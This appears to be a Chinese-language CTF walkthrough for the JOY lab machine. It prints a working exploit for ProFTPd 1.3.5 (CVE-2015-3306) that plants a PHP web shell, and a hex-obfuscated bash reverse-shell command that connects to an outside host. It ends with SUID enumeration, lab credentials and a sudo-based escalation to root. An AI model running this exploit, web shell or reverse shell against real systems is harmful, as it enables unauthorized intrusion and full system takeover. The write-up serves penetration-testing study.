## ftp
```text
Version Control of External-Facing Services:

Apache: 2.4.25
Dropbear SSH: 0.34
ProFTPd: 1.3.5
Samba: 4.5.12

We should switch to OpenSSH and upgrade ProFTPd.

Note that we have some other configurations in this machine.
1. The webroot is no longer /var/www/html. We have changed it to /var/www/tryingharderisjoy.
2. I am trying to perform some simple bash scripting tutorials. Let me see how it turns out
```


## 利用ProFTPd 1.3.5的漏洞
```python
#!/usr/bin/env python
# CVE-2015-3306 exploit by t0kx
# https://github.com/t0kx/exploit-CVE-2015-3306

import re
import socket
import requests
import argparse

class Exploit:
    def __init__(self, host, port, path):
        self.__sock = None
        self.__host = host
        self.__port = port
        self.__path = path

    def __connect(self):
        self.__sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.__sock.connect((self.__host, self.__port))
        self.__sock.recv(1024)

    def __exploit(self):
        payload = "<?php echo passthru($_GET['cmd']); ?>"
        self.__sock.send(b"site cpfr /proc/self/cmdline\n")
        self.__sock.recv(1024)
        self.__sock.send(("site cpto /tmp/." + payload + "\n").encode("utf-8"))
        self.__sock.recv(1024)
        self.__sock.send(("site cpfr /tmp/." + payload + "\n").encode("utf-8"))
        self.__sock.recv(1024)
        self.__sock.send(("site cpto "+ self.__path +"/backdoor.php\n").encode("utf-8"))

        if "Copy successful" in str(self.__sock.recv(1024)):
            print("[+] Target exploited, acessing shell at http://" + self.__host + "/backdoor.php")
            print("[+] Running whoami: " + self.__trigger())
            print("[+] Done")
        else:
            print("[!] Failed")

    def __trigger(self):
        data = requests.get("http://" + self.__host + "/backdoor.php?cmd=whoami")
        match = re.search('cpto /tmp/.([^"]+)', data.text)
        return match.group(0)[11::].replace("\n", "")

    def run(self):
        self.__connect()
        self.__exploit()

def main(args):
    print("[+] CVE-2015-3306 exploit by t0kx")
    print("[+] Exploiting " + args.host + ":" + args.port)

    exploit = Exploit(args.host, int(args.port), args.path)
    exploit.run()

if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument('--host', required=True)
    parser.add_argument('--port', required=True)
    parser.add_argument('--path', required=True)
    args = parser.parse_args()

    main(args)
```
> python exploit.py --host 192.168.80.146 --port 21 --path /var/www/tryingharderisjoy
 
```shell
http://192.168.80.146/backdoor.php?cmd=which xxd

对反弹shell进行16进制编码绕过：

echo 62617368202d63202762617368202d6920263e2f6465762f7463702f3137322e32362e33322e32302f3434343420303e2631270a | xxd -r -p | bash
```


# 提权

```
find / -perm -u=s -type f 2>/dev/null
/bin/ntfs-3g
/bin/fusermount
/bin/umount
/bin/su
/bin/mount
/bin/ping
/lib/uncompress.so
/usr/sbin/pppd
/usr/bin/passwd
/usr/bin/chfn
/usr/bin/newgrp
/usr/bin/pkexec
/usr/bin/chsh
/usr/bin/gpasswd
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/xorg/Xorg.wrap
/usr/lib/spice-gtk/spice-client-glib-usb-acl-helper
/usr/lib/openssh/ssh-keysign
/usr/lib/eject/dmcrypt-get-device


```





```
/home/patrick/haha
/var/www/tryingharderisjoy/ossec/.hgtags
/var/www/tryingharderisjoy/ossec/README.search
/var/www/tryingharderisjoy/ossec/CONTRIB
/var/www/tryingharderisjoy/ossec/.htpasswd
/var/www/tryingharderisjoy/ossec/tmp/.htaccess
/var/www/tryingharderisjoy/ossec/ossec_conf.php
/var/www/tryingharderisjoy/ossec/index.php
/var/www/tryingharderisjoy/ossec/README
/var/www/tryingharderisjoy/ossec/css/images/hr_tag_sep.gif
/var/www/tryingharderisjoy/ossec/css/images/favicon.ico
/var/www/tryingharderisjoy/ossec/css/images/pagebg.gif
/var/www/tryingharderisjoy/ossec/css/images/hr_title_sep.gif
/var/www/tryingharderisjoy/ossec/css/images/arrow.gif
/var/www/tryingharderisjoy/ossec/css/css.css
/var/www/tryingharderisjoy/ossec/css/cal.css
/var/www/tryingharderisjoy/ossec/setup.sh
/var/www/tryingharderisjoy/ossec/LICENSE
/var/www/tryingharderisjoy/ossec/patricksecretsofjoy
/var/www/tryingharderisjoy/ossec/.htaccess
/var/www/tryingharderisjoy/ossec/js/calendar-en.js
/var/www/tryingharderisjoy/ossec/js/calendar-setup.js
/var/www/tryingharderisjoy/ossec/js/hide.js
/var/www/tryingharderisjoy/ossec/js/calendar.js
/var/www/tryingharderisjoy/ossec/js/prototype.js
/var/www/tryingharderisjoy/ossec/img/191x81.jpg
/var/www/tryingharderisjoy/ossec/img/ossecLogo.png
/var/www/tryingharderisjoy/ossec/img/webui.png
/var/www/tryingharderisjoy/ossec/img/calendar.gif
/var/www/tryingharderisjoy/ossec/img/background.png
/var/www/tryingharderisjoy/ossec/img/ossec_webui.png
/var/www/tryingharderisjoy/ossec/img/ossec_webui.jpg
/var/www/tryingharderisjoy/ossec/img/donate.gif
/var/www/tryingharderisjoy/ossec/lib/ossec_formats.php
/var/www/tryingharderisjoy/ossec/lib/ossec_categories.php
/var/www/tryingharderisjoy/ossec/lib/os_lib_util.php
/var/www/tryingharderisjoy/ossec/lib/os_lib_alerts.php
/var/www/tryingharderisjoy/ossec/lib/os_lib_agent.php
/var/www/tryingharderisjoy/ossec/lib/os_lib_syscheck.php
/var/www/tryingharderisjoy/ossec/lib/os_lib_handle.php
/var/www/tryingharderisjoy/ossec/lib/os_lib_firewall.php
/var/www/tryingharderisjoy/ossec/lib/Ossec/Histogram.php
/var/www/tryingharderisjoy/ossec/lib/Ossec/AlertList.php
/var/www/tryingharderisjoy/ossec/lib/Ossec/Alert.php
/var/www/tryingharderisjoy/ossec/lib/.htaccess
/var/www/tryingharderisjoy/ossec/lib/os_lib_stats.php
/var/www/tryingharderisjoy/ossec/lib/os_lib_mapping.php
/var/www/tryingharderisjoy/ossec/htaccess_def.txt
/var/www/tryingharderisjoy/ossec/site/stats.php
/var/www/tryingharderisjoy/ossec/site/main.php
/var/www/tryingharderisjoy/ossec/site/header.html
/var/www/tryingharderisjoy/ossec/site/user_mapping.php
/var/www/tryingharderisjoy/ossec/site/.htaccess
/var/www/tryingharderisjoy/ossec/site/search.php
/var/www/tryingharderisjoy/ossec/site/searchfw.php
/var/www/tryingharderisjoy/ossec/site/help.php
/var/www/tryingharderisjoy/ossec/site/footer.html
/var/ossec/logs/ossec.log
/var/ossec/etc/shared/rootkit_trojans.txt
/var/ossec/etc/shared/agent.conf
/var/ossec/etc/shared/cis_sles11_linux_rcl.txt
/var/ossec/etc/shared/cis_win2016_memberL2_rcl.txt
/var/ossec/etc/shared/cis_mysql5-6_community_rcl.txt
/var/ossec/etc/shared/cis_debianlinux7-8_L2_rcl.txt
/var/ossec/etc/shared/cis_apache2224_rcl.txt
/var/ossec/etc/shared/cis_win2016_domainL2_rcl.txt
/var/ossec/etc/shared/cis_win2012r2_domainL1_rcl.txt
/var/ossec/etc/shared/win_malware_rcl.txt
/var/ossec/etc/shared/cis_win2016_memberL1_rcl.txt
/var/ossec/etc/shared/win_applications_rcl.txt
/var/ossec/etc/shared/cis_win2012r2_memberL2_rcl.txt
/var/ossec/etc/shared/acsc_office2016_rcl.txt
/var/ossec/etc/shared/cis_win10_enterprise_L2_rcl.txt
/var/ossec/etc/shared/win_audit_rcl.txt
/var/ossec/etc/shared/cis_win2012r2_memberL1_rcl.txt
/var/ossec/etc/shared/cis_rhel_linux_rcl.txt
/var/ossec/etc/shared/cis_rhel7_linux_rcl.txt
/var/ossec/etc/shared/cis_win10_enterprise_L1_rcl.txt
/var/ossec/etc/shared/rootkit_files.txt
/var/ossec/etc/shared/cis_mysql5-6_enterprise_rcl.txt
/var/ossec/etc/shared/cis_sles12_linux_rcl.txt
/var/ossec/etc/shared/cis_rhel6_linux_rcl.txt
/var/ossec/etc/shared/cis_debianlinux7-8_L1_rcl.txt
/var/ossec/etc/shared/cis_win2012r2_domainL2_rcl.txt
/var/ossec/etc/shared/cis_rhel5_linux_rcl.txt
/var/ossec/etc/shared/cis_debian_linux_rcl.txt
/var/ossec/etc/shared/cis_win2016_domainL1_rcl.txt
/var/ossec/etc/local_internal_options.conf
/var/ossec/etc/ossec.conf
/usr/bin/sudo
```

```shell
cat patricksecretsofjoy

	credentials for JOY:
	patrick:apollo098765
	root:howtheheckdoiknowwhattherootpasswordis
	
	how would these hack3rs ever find such a page?

```

>切换到用户patrick，sudo -l发现test文件

```
echo "/bin/bash" > test
通过ftp上传到download目录

telnet 192.168.80.146 21
	site cprf /home/ftp/download/test
	site cpto /home/patrick/script/test

sudo /home/patrick/scirpt/test

得到root权限

```


